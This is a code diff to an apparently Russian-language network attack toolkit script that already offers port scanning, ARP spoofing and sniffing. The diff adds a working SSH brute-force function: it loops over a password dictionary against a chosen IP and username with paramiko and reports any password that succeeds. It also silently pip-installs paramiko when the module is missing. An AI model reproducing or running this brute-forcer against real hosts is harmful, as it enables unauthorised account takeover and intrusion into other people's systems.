@@ -10,6 +10,13 @@ from rich.console import Console
 from rich.table import Table
 from rich.spinner import Spinner
 from datetime import datetime
+try:
+    import paramiko 
+except:
+    os.system('pip install paramiko')
+    import paramiko 
+
+import time 
 
 from pystyle import Center
 try:
@@ -26,6 +33,11 @@ table = Table(title="PORTS")
 table.add_column("port", style="cyan", no_wrap=True)
 table.add_column("name", style="magenta")
 table.add_column("status", justify="right", style="yellow")
+
+out_table = Table(title="PORTS")
+out_table.add_column("port", style="cyan", no_wrap=True)
+out_table.add_column("name", style="magenta")
+out_table.add_column("status", justify="right", style="yellow")
 
 ports_names = {
     20: "FTP-DATA", 21: "FTP", 22: "SSH", 23: "Telnet",
@@ -54,6 +66,7 @@ def port_scan():
 
         else:
             table.add_row(str(port), port_name, "✅open")
+            out_table.add_row(str(port), port_name, "✅open")
 
 
     ip = input(Center.XCenter(colored('[+]Введите ip для сканирования портов: ', "red")))
@@ -82,6 +95,9 @@ def port_scan():
         console.print('ip: ' + str(ip), justify="center", style="red")
         console.print('ports: ' + str(ports_for_scan), justify="center", style="red")
         console.print(table, justify='center')
+    console.print('ip: ' + str(ip), justify="center", style="red")
+    console.print('ports: ' + str(ports_for_scan), justify="center", style="red")
+    console.print(out_table, justify='center')
     
 
 #############################################################
@@ -188,6 +204,24 @@ def snifer():
 #############################################################
 #############################################################
 
+def SSH_Brut():
+    console = Console()
+    ip = input(Center.XCenter(colored('[+]Введите IP >> ', "red")))
+    username = input(Center.XCenter(colored('[+]Введите username >> ', "red")))
+    dictionary = open("dictionary.txt", "r").readlines() 
+
+    for password in dictionary: 
+        try: 
+            uclear()
+            console.print('testing: ' + password, style="red", justify="center")
+            client = paramiko.SSHClient() 
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
+            client.connect(ip, username=username, password=password) 
+            console.print('[+]ip: ' + ip, "\n[+]Password: " + password, style="green", justify="center") 
+            client.close() 
+            return 
+        except paramiko.AuthenticationException: 
+            pass 
 
 
 
@@ -202,12 +236,14 @@ def main():
     console.print('║ [2] - Просканировать WiFi сеть ║', justify='center', style='yellow')
     console.print('║ [3] - ARP запрос               ║', justify='center', style='yellow')
     console.print('║ [4] - ArpSpoofer               ║', justify='center', style='yellow')
+    console.print('║ [5] - Snifer                   ║', justify='center', style='yellow')
+    console.print('║ [6] - Brut SSH                 ║', justify='center', style='yellow')
     console.print('║                                ║', justify='center', style='yellow')
     console.print('║ (b) - Вернутся                 ║', justify='center', style='yellow')
     console.print('╚════════════════════════════════╝', justify='center', style='yellow')
     
 
-    select = input(Center.XCenter(colored("""\n[+]Select> """, "red")))
+    select = input(Center.XCenter(colored("""\n[+]Select >> """, "red")))
 
     if select == 'b':
         import main
@@ -224,5 +260,11 @@ def main():
 
     elif select == '4':
         ArpSpoofer()
+    
+    elif select == '5':
+        snifer()
+    
+    elif select == '6':
+        SSH_Brut()
 
 main()
